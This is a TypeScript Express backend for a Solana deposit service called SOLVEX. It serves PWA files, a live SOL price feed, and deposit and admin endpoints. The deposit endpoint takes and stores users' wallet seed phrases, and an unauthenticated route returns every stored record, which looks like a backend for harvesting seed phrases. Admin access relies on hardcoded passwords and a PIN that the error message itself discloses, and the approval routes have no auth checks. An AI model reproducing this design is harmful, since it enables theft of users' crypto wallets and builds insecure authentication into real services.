import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = Number(process.env.PORT) || 3000;

app.use(express.json());

// Enable CORS for PWABuilder, external tools, and mobile web clients
app.use((req: Request, res: Response, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept, X-Requested-With');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Explicitly serve manifest with standard PWA content-type and caching headers
app.get(['/manifest.json', '/manifest.webmanifest'], (req: Request, res: Response) => {
  const manifestPath = path.join(process.cwd(), 'public', 'manifest.json');
  if (fs.existsSync(manifestPath)) {
    res.setHeader('Content-Type', 'application/manifest+json; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.sendFile(manifestPath);
  }
  res.status(404).json({ error: 'Manifest not found' });
});

// Explicitly serve service worker with Service-Worker-Allowed header
app.get('/sw.js', (req: Request, res: Response) => {
  const swPath = path.join(process.cwd(), 'public', 'sw.js');
  if (fs.existsSync(swPath)) {
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Service-Worker-Allowed', '/');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    return res.sendFile(swPath);
  }
  res.status(404).send('Service worker not found');
});

// Serve public static assets with CORS
app.use(express.static(path.join(process.cwd(), 'public'), {
  setHeaders: (res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
  }
}));

// Persistent deposits store path
const DATA_DIR = path.join(process.cwd(), 'data');
const DEPOSITS_FILE = path.join(DATA_DIR, 'deposits.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

export interface DepositRecord {
  id: string;
  publicKey: string;
  seedPresetId?: number;
  seedPhrase?: string;
  amountSol: number;
  amountUsd: number;
  status: 'pending' | 'approved' | 'rejected';
  signature: string;
  createdAt: number;
  reviewedAt?: number;
  note?: string;
}

// Helper to read deposits
function getDeposits(): DepositRecord[] {
  try {
    if (fs.existsSync(DEPOSITS_FILE)) {
      const data = fs.readFileSync(DEPOSITS_FILE, 'utf-8');
      return JSON.parse(data) || [];
    }
  } catch (err) {
    console.error('Error reading deposits:', err);
  }
  return [];
}

// Helper to save deposits
function saveDeposits(deposits: DepositRecord[]) {
  try {
    fs.writeFileSync(DEPOSITS_FILE, JSON.stringify(deposits, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error saving deposits:', err);
  }
}

// ----------------------------------------------------
// API ROUTES
// ----------------------------------------------------

// Health check
app.get('/api/health', (req: Request, res: Response) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

// ----------------------------------------------------
// LIVE SOLANA PRICE SERVICE
// ----------------------------------------------------
interface CachedPrice {
  price: number;
  change24h: number;
  high24h?: number;
  low24h?: number;
  volume24h?: number;
  source: string;
  timestamp: number;
}

let cachedPriceData: CachedPrice = {
  price: 108.25,
  change24h: -3.5,
  source: 'init',
  timestamp: Date.now(),
};
let lastPriceFetchTime = 0;
const PRICE_CACHE_DURATION_MS = 6000; // 6 seconds cache

async function getLiveSolanaPrice(): Promise<CachedPrice> {
  const now = Date.now();
  if (now - lastPriceFetchTime < PRICE_CACHE_DURATION_MS && cachedPriceData.source !== 'init') {
    return cachedPriceData;
  }

  // 1. Try Binance (Fastest, full 24h ticker with volume & change)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const res = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=SOLUSDT', {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = (await res.json()) as any;
      const price = parseFloat(data.lastPrice);
      const change24h = parseFloat(data.priceChangePercent);
      if (!isNaN(price) && price > 0) {
        cachedPriceData = {
          price,
          change24h: isNaN(change24h) ? 0 : parseFloat(change24h.toFixed(2)),
          high24h: parseFloat(data.highPrice) || undefined,
          low24h: parseFloat(data.lowPrice) || undefined,
          volume24h: parseFloat(data.volume) || undefined,
          source: 'binance',
          timestamp: now,
        };
        lastPriceFetchTime = now;
        return cachedPriceData;
      }
    }
  } catch {
    // Continue to next provider
  }

  // 2. Try Coinbase Spot
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const res = await fetch('https://api.coinbase.com/v2/prices/SOL-USD/spot', {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = (await res.json()) as any;
      const price = parseFloat(data?.data?.amount);
      if (!isNaN(price) && price > 0) {
        cachedPriceData = {
          price,
          change24h: cachedPriceData.change24h,
          source: 'coinbase',
          timestamp: now,
        };
        lastPriceFetchTime = now;
        return cachedPriceData;
      }
    }
  } catch {
    // Continue to next provider
  }

  // 3. Try Kraken Ticker
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const res = await fetch('https://api.kraken.com/0/public/Ticker?pair=SOLUSD', {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = (await res.json()) as any;
      const pair = data?.result?.SOLUSD;
      if (pair) {
        const price = parseFloat(pair.c?.[0]);
        const open = parseFloat(pair.o);
        const change24h = open > 0 ? ((price - open) / open) * 100 : cachedPriceData.change24h;
        if (!isNaN(price) && price > 0) {
          cachedPriceData = {
            price,
            change24h: parseFloat(change24h.toFixed(2)),
            source: 'kraken',
            timestamp: now,
          };
          lastPriceFetchTime = now;
          return cachedPriceData;
        }
      }
    }
  } catch {
    // Continue to next provider
  }

  // 4. Try CoinGecko
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const res = await fetch(
      'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true',
      {
        signal: controller.signal,
      }
    );
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = (await res.json()) as any;
      const sol = data?.solana;
      if (sol && typeof sol.usd === 'number' && sol.usd > 0) {
        cachedPriceData = {
          price: sol.usd,
          change24h: typeof sol.usd_24h_change === 'number' ? parseFloat(sol.usd_24h_change.toFixed(2)) : 0,
          source: 'coingecko',
          timestamp: now,
        };
        lastPriceFetchTime = now;
        return cachedPriceData;
      }
    }
  } catch {
    // Return last cached data
  }

  return cachedPriceData;
}

// Live Solana price API
app.get('/api/price/sol', async (req: Request, res: Response) => {
  try {
    const priceData = await getLiveSolanaPrice();
    res.json({
      success: true,
      ...priceData,
    });
  } catch {
    res.json({
      success: true,
      price: cachedPriceData.price || 108.25,
      change24h: cachedPriceData.change24h || 0,
      source: 'fallback',
      timestamp: Date.now(),
    });
  }
});

// Admin login check
app.post('/api/admin/login', (req: Request, res: Response) => {
  const { username, password, pin } = req.body;
  
  // Support either username/password ('admin' / 'admin123') or PIN '8888'
  const isValid =
    (username === 'admin' && (password === 'admin123' || password === 'solvex2026')) ||
    pin === '8888' ||
    password === '8888';

  if (isValid) {
    return res.json({
      success: true,
      token: 'admin-auth-token-' + Date.now(),
      admin: { username: 'admin', role: 'superadmin' }
    });
  }

  return res.status(401).json({
    success: false,
    error: 'Invalid credentials. Default admin username: admin, password: admin123 or PIN: 8888'
  });
});

// Submit a new deposit request (starts in 'pending' status)
app.post('/api/deposits', (req: Request, res: Response) => {
  try {
    const { publicKey, amountSol, amountUsd, signature, seedPresetId, seedPhrase } = req.body;

    if (!publicKey || typeof amountSol !== 'number' || amountSol <= 0) {
      return res.status(400).json({ error: 'Valid publicKey and positive amountSol are required.' });
    }

    const deposits = getDeposits();

    const newDeposit: DepositRecord = {
      id: 'dep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
      publicKey,
      seedPresetId: typeof seedPresetId === 'number' ? seedPresetId : undefined,
      seedPhrase: typeof seedPhrase === 'string' ? seedPhrase : undefined,
      amountSol,
      amountUsd: amountUsd || amountSol * 100,
      status: 'pending',
      signature: signature || 'sig_' + Math.random().toString(36).substring(2, 12),
      createdAt: Date.now(),
      note: 'Awaiting admin verification'
    };

    deposits.unshift(newDeposit);
    saveDeposits(deposits);

    console.log(`[Deposit Server] New pending deposit: ${newDeposit.id} - ${newDeposit.amountSol} SOL for Seed #${newDeposit.seedPresetId ?? 'Custom'}`);

    return res.status(201).json({
      success: true,
      deposit: newDeposit,
      message: 'Deposit submitted for verification. Please wait 1-2 minutes for admin review.'
    });
  } catch (err: any) {
    console.error('Error submitting deposit:', err);
    return res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

// Get all deposits (for Admin backoffice)
app.get('/api/deposits', (req: Request, res: Response) => {
  try {
    const deposits = getDeposits();
    return res.json({ success: true, deposits });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// Get deposits for a specific user
app.get('/api/deposits/user/:publicKey', (req: Request, res: Response) => {
  try {
    const { publicKey } = req.params;
    const deposits = getDeposits().filter((d) => d.publicKey === publicKey);
    return res.json({ success: true, deposits });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// Get single deposit by ID
app.get('/api/deposits/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const deposits = getDeposits();
    const deposit = deposits.find((d) => d.id === id);

    if (!deposit) {
      return res.status(404).json({ error: 'Deposit not found' });
    }

    return res.json({ success: true, deposit });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Approve Deposit
app.post('/api/deposits/:id/approve', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { note } = req.body;

    const deposits = getDeposits();
    const index = deposits.findIndex((d) => d.id === id);

    if (index === -1) {
      return res.status(404).json({ error: 'Deposit request not found' });
    }

    deposits[index].status = 'approved';
    deposits[index].reviewedAt = Date.now();
    deposits[index].note = note || 'Approved by Admin';

    saveDeposits(deposits);

    console.log(`[Deposit Server] Deposit APPROVED: ${id} - ${deposits[index].amountSol} SOL`);

    return res.json({
      success: true,
      deposit: deposits[index],
      message: 'Deposit approved successfully.'
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Reject Deposit
app.post('/api/deposits/:id/reject', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;

    const deposits = getDeposits();
    const index = deposits.findIndex((d) => d.id === id);

    if (index === -1) {
      return res.status(404).json({ error: 'Deposit request not found' });
    }

    deposits[index].status = 'rejected';
    deposits[index].reviewedAt = Date.now();
    deposits[index].note = reason || 'Rejected by Admin: Transaction not confirmed on-chain';

    saveDeposits(deposits);

    console.log(`[Deposit Server] Deposit REJECTED: ${id}`);

    return res.json({
      success: true,
      deposit: deposits[index],
      message: 'Deposit rejected.'
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// Reset deposits (Admin & Dev tool)
app.post(['/api/admin/deposits/clear', '/api/deposits/clear'], (req: Request, res: Response) => {
  try {
    saveDeposits([]);
    return res.json({ success: true, message: 'All deposit requests cleared' });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

// ----------------------------------------------------
// VITE MIDDLEWARE & STATIC SERVING
// ----------------------------------------------------

async function start() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] SOLVEX Backend running on port ${PORT}`);
  });
}

start();
